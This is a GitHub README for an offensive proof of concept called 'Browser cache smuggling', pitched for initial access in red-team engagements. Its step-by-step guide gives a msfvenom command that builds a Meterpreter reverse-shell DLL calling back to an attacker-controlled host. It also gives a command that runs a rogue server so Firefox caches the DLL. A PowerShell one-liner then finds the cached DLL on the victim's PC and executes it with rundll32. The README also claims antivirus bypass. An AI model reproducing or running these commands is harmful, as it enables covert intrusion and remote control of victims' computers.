# Browser cache smuggling Attack

- This repository is all about the POC that can be leveraged down for initial access in red teaming engagements.
- This has the capabilities to bypass AV , depends on from where DLL is generated !!
- This Repo is in development , we will be adding more module for Brave & Chrome Browser soon....

# Theory Behind it :

![](https://raw.githubusercontent.com/surya-dev-singh/BrowserCacheSmuggling/main/Firefox%20Cache%20Smuggling.png)

- To better understand how this attack work , please navigate to:
https://surya-dev-singh.github.io/posts/Cache-Smuggling-Attack/

# How to Execute it ?

## **Step 1 :** 
Git Clone the URL  & install the dependency : `pip3 install -r requirements.txt` 
also make sure Nginx is installed on the machine 

## **Step 2:** 
create your malicious DLL file , from your favorite C2 server . example :
`msfvenom -p /windows/x64/meterpreter/reverse_tcp LHOST=<localip> LPORT=<local_port> -f dll -o malicious.dll` and configure your listener accordingly .

## **Step 3:**
Host you rouge Server that coerce browser to Cache The response.

```python3
python3 browsercachesmuggling.py --dll /root/smugglers.dll <malicious_dll>
```

![](https://surya-dev-singh.github.io/assets/img/Cache%20Smuggling%20Attack/Pasted%20image%2020231025192341.png)

## Step 4:
Once Our data is begin cache , we can now run the following command on victim PC like so: 

```powershell
foreach ($files in @("$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries\")) {Get-ChildItem $files -Recurse | ForEach-Object {if (Select-String -Pattern "ENTRYPOINT" -Path $_.FullName) {$dllPath = $_.FullName + '.'; rundll32.exe $dllPath,MainDll}}}
```
**NOTE:** From the above command , make sure when u are running the dll file from rundll32 , you provide proper entry point eg (MainDLL) , which may be different for havoc C2.
and we will get our reverse shell !! 
